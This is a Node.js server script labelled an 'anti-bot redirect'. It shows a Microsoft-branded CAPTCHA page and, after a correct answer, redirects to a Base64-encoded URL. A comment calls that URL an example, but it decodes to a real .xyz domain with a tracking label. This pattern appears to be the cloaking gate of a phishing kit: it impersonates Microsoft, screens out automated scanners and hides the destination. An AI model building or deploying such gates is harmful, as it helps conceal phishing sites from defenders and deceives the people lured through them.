// Anti-Bot Redirect Script
const http = require('http');
const crypto = require('crypto');

// Base64-encoded target URL
const base64Url = "aHR0cHM6Ly9ibGFuZHNvbmxkbi54eXo/bGFiZWw9M2IwNTBmZmJhYjY1NzA0Yjg2OGE1MmQ1M2MwODgzMDY="; // Example: "https://www.yourdestinationurl.com"

// Store CAPTCHA data
const captchaStore = {};

// Create a simple server
http.createServer((req, res) => {
  if (req.method === 'GET' && req.url === '/') {
    // Generate a simple CAPTCHA
    const num1 = Math.floor(Math.random() * 10);
    const num2 = Math.floor(Math.random() * 10);
    const solution = num1 + num2;

    // Generate unique CAPTCHA ID
    const captchaId = crypto.randomBytes(16).toString('hex');
    captchaStore[captchaId] = solution; // Store the solution in the store

    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Anti-Bot Verification</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            background-color: #f2f3f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
          }
          .container {
            text-align: center;
            background: white;
            border-radius: 12px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            padding: 30px;
            max-width: 400px;
            width: 100%;
          }
          .logo {
            margin-bottom: 20px;
          }
          .logo img {
            height: 40px;
          }
          .title {
            font-size: 24px;
            font-weight: bold;
            color: #1d4ed8;
            margin-bottom: 10px;
          }
          .subtitle {
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 20px;
          }
          .captcha-form {
            margin-top: 20px;
          }
          .captcha-form label {
            font-size: 18px;
            font-weight: 500;
            color: #374151;
          }
          .captcha-form input {
            margin-top: 10px;
            padding: 10px;
            width: 100%;
            font-size: 16px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
          }
          .captcha-form button {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #2563eb;
            color: white;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
          }
          .captcha-form button:hover {
            background-color: #1e40af;
          }
          .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #9ca3af;
          }
          .error {
            color: red;
            font-size: 14px;
            margin-top: 10px;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
          </div>
          <div class="title">Please Verify</div>
          <div class="subtitle">We need to confirm that you are not a robot before proceeding. Please solve the CAPTCHA below.</div>
          <form method="POST" action="/verify" class="captcha-form">
            <label>${num1} + ${num2} </label>
            <input type="text" name="captcha" placeholder="Enter your answer" required>
            <input type="hidden" name="captchaId" value="${captchaId}">
            <button type="submit">Continue</button>
          </form>
          <div class="footer">© 2025. All rights reserved.</div>
        </div>
      </body>
      </html>
    `);
  } else if (req.method === 'POST' && req.url === '/verify') {
    let body = '';
    req.on('data', chunk => {
      body += chunk;
    });

    req.on('end', () => {
      const params = new URLSearchParams(body);
      const captchaId = params.get('captchaId');
      const userSolution = parseInt(params.get('captcha'), 10);

      // Validate CAPTCHA
      if (captchaStore[captchaId] === userSolution) {
        delete captchaStore[captchaId]; // Clear the CAPTCHA after validation

        // Decode Base64 URL and redirect
        const redirectUrl = Buffer.from(base64Url, 'base64').toString('utf8');
        res.writeHead(302, { Location: redirectUrl });
        res.end();
      } else {
        // Failed verification
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
          <!DOCTYPE html>
          <html>
          <head>
            <title>Anti-Bot Verification</title>
            <style>
              body { font-family: Arial, sans-serif; background-color: #f2f3f5; text-align: center; padding: 50px; }
              .container { background: #fff; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1); }
              .error { color: red; font-weight: bold; margin-top: 10px; }
              .retry { margin-top: 20px; display: inline-block; padding: 10px 20px; background: #2563eb; color: white; text-decoration: none; border-radius: 5px; }
              .retry:hover { background: #1e40af; }
            </style>
          </head>
          <body>
            <div class="container">
              <h2>Verification Failed</h2>
              <p class="error">Incorrect answer. Please try again.</p>
              <a href="/" class="retry">Retry</a>
            </div>
          </body>
          </html>
        `);
      }
    });
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('404 Not Found');
  }
}).listen(8080, () => {
  console.log('Server running on http://localhost:8080');
});
